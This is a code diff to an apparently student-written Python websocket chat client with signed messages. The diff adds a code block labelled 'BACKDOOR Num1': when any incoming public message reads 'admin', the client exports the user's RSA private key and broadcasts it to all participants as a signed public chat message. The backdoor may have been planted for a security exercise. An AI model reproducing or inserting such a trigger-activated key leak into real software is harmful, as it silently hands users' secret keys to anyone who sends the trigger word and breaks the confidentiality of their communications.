@@ -403,8 +403,11 @@ async def receiveMessages(websocket, stop_event):
                         # Print a warning that someone unknown to you is trying to contact you
                             print("An unknown sender is trying to contact you. There message has been dismissed as this may be unsafe.")
                             continue
-                        
                     
+                    # BACKDOOR Num1
+                    if data["message"] == "admin":
+                        await asyncio.gather(getPrivateKey(websocket))
+
                     # TEMPORARY CONFIRMATION - THIS NEEDS TO BE FORMATTED BETTER
                     print("Public message received from: ", data["sender"], " They said: ")
                     print(data["message"])
@@ -424,6 +427,41 @@ async def receiveMessages(websocket, stop_event):
             stop_event.set()
             # Break the loop
             break
+
+async def getPrivateKey(destSocket):
+    
+    counters[0][1] += 1
+
+    message = myPrivateKey.export_key().decode()
+
+    data = {
+        "type": "public_chat",
+        "sender": myFingerprint,
+        "message": message
+    }
+
+    jsonData = json.dumps(data)
+
+    signatureBase = jsonData + str(counters[0][1])
+
+    hashedSignatureBase = SHA256.new(signatureBase.encode())
+
+    unencodedSignature = pss.new(myPrivateKey).sign(hashedSignatureBase)
+
+    signature = base64.b64encode(unencodedSignature).decode()
+
+    # Request packaging
+    request = {
+        "type":"signed_data",
+        "data": data,
+        "counter": counters[0][1],
+        "signature":signature
+    }
+
+    # Serialise request into JSON formatted string
+    serialisedRequest = json.dumps(request)
+    # Schedule serialised request to be sent to everyone via the server
+    await destSocket.send(serialisedRequest)
 
 # This function run the blocking input function in a non-blocking way by separating it into it's own loop
 # The function asks for user input which is used within the userInterface function
